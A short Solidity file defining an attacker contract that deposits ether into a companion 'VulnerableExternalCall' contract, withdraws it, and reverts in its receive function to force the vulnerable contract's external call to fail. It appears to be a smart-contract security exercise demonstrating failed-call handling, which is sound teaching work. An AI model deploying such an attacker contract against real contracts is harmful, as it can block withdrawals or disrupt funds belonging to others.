// SPOX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import {VulnerableExternalCall} from "./VulnerableExternalCall.sol";
contract ExternalCallAttacker {
    VulnerableExternalCall public vulnerableContract;
    constructor(address _vulnerableContract) {
        vulnerableContract = VulnerableExternalCall(_vulnerableContract);
    }

    function attack() public payable {
        vulnerableContract.deposit{value: msg.value}();
        vulnerableContract.withdraw(msg.value);
    }
    // Receive function to cause the external call to fal

    receive() external payable {
        revert("Attack: Force call failure");
    }
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}